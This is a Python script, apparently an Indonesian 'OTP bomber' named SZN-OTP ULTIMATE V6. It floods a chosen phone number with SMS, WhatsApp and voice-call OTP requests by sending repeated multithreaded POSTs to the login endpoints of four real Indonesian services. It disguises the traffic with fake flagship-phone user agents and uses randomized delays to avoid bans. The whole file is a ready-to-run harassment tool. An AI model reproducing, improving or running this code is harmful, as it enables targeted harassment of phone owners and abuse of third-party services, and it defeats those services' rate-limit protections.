import requests
import threading
import time
import random
import os
import sys
from datetime import datetime

# --- WARNA MODEREN (BIAR GAK MINUS MATANYA) ---
G = '\033[92m'  # Hijau Terang
R = '\033[91m'  # Merah Terang
Y = '\033[93m'  # Kuning
B = '\033[94m'  # Biru
C = '\033[96m'  # Cyan
W = '\033[0m'   # Reset

class SZN_AutoPilot_Engine:
    def __init__(self, target):
        self.target_raw = target
        self.target_intl = self.format_ke_intl(target) # Format +62
        self.target_local = self.format_ke_local(target) # Format 08
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
        
        # DATABASE USER-AGENT (Nyamar jadi HP Flagship)
        self.device_pool = [
            "Samsung Galaxy S24 Ultra Build/UP1A.231005.007",
            "iPhone 15 Pro Max; CPU iPhone OS 17_4 like Mac OS X",
            "Google Pixel 8 Pro Build/UD1A.231105.004",
            "Xiaomi 14 Pro; Android 14; HyperOS"
        ]

    def format_ke_intl(self, n):
        n = n.replace("+", "").replace(" ", "").replace("-", "")
        if n.startswith("08"): return "+62" + n[1:]
        if n.startswith("8"): return "+62" + n
        if n.startswith("62"): return "+" + n
        return "+" + n

    def format_ke_local(self, n):
        n = n.replace("+", "").replace(" ", "").replace("-", "")
        if n.startswith("62"): return "0" + n[2:]
        if n.startswith("8"): return "0" + n
        return n

    def get_fake_headers(self):
        return {
            'User-Agent': f"Mozilla/5.0 (Linux; Android 14; {random.choice(self.device_pool)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
            'Content-Type': 'application/json',
            'Referer': 'https://www.google.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        }

    def execute_strike(self, api_name, url, payload_func):
        """Mesin Eksekusi Peluru Otomatis"""
        try:
            payload = payload_func()
            headers = self.get_fake_headers()
            
            # Request dengan timeout panjang biar gak gampang timeout
            res = requests.post(url, json=payload, headers=headers, timeout=20)
            
            with self.lock:
                status = f"{G}SUCCESS{W}" if res.status_code in [200, 201] else f"{R}FAIL ({res.status_code}){W}"
                if "SUCCESS" in status: self.success += 1
                else: self.failed += 1
                print(f"[{datetime.now().strftime('%H:%M:%S')}] {C}{api_name:15}{W} => {status}")
        except:
            with self.lock:
                self.failed += 1
                print(f"[{datetime.now().strftime('%H:%M:%S')}] {Y}{api_name:15}{W} => {R}TIMEOUT/BLOCK{W}")

    def start_storm(self, wave_count):
        # DAFTAR API TERPILIH (SMS, WA, CALL)
        api_list = [
            ("WA-SKILL-ACA", "https://dashboard.skillacademy.com/api/v1/auth/otp", lambda: {"phoneNumber": self.target_local}),
            ("SMS-MATAHARI", "https://api.matahari.com/v1/auth/otp", lambda: {"phone": self.target_local, "type": "register"}),
            ("CALL-ALODOK", "https://api.alodokter.com/v1/auth/otp_call", lambda: {"phone": self.target_local}),
            ("WA-KREDIT-PT", "https://api.kreditpintar.com/v1/auth/otp", lambda: {"phone": self.target_local, "category": "SIGN_IN"})
        ]

        for w in range(wave_count):
            print(f"\n{B}>>> MENGIRIM GELOMBANG KE-{w+1} <<<{W}")
            threads = []
            for name, url, p_func in api_list:
                t = threading.Thread(target=self.execute_strike, args=(name, url, p_func))
                threads.append(t)
                t.start()
            
            for t in threads: t.join()
            
            # SMART AUTO-DELAY (Rahasia Anti-Banned)
            jeda = random.uniform(4.0, 8.5)
            print(f"{Y}[!] Cooling system: {jeda:.2f} detik...{W}")
            time.sleep(jeda)

def display_banner():
    os.system('clear')
    print(f"""{C}
    ╔══════════════════════════════════════════════════╗
    ║   {G}SZN-OTP ULTIMATE V6 {W}- {R}AUTO-PILOT BRUTAL MODE{C}   ║
    ║   {W}Target Intl: {Y}+62-8xxx {W}| {W}Engine: {G}Multi-Threaded{C}   ║
    ╚══════════════════════════════════════════════════╝{W}""")

if __name__ == "__main__":
    display_banner()
    num = input(f"{B}[?] Input Target (Contoh: 0896xxx): {W}")
    bot = SZN_AutoPilot_Engine(num)
    
    print(f"{G}[+] Target Terkunci: {bot.target_intl}{W}")
    gelombang = int(input(f"{B}[?] Jumlah Serangan (Wave): {W}"))
    
    print(f"\n{R}[WARNING] SERANGAN DIMULAI! SI SANZ BAKAL PANAS...{W}")
    try:
        bot.start_storm(gelombang)
    except KeyboardInterrupt:
        print(f"\n{R}[!] Serangan Dihentikan Paksa oleh User.{W}")
    
    print(f"\n{C}═══ [ RINGKASAN SERANGAN ] ═══")
    print(f"{G}BERHASIL : {bot.success}")
    print(f"{R}GAGAL    : {bot.failed}{W}")
        
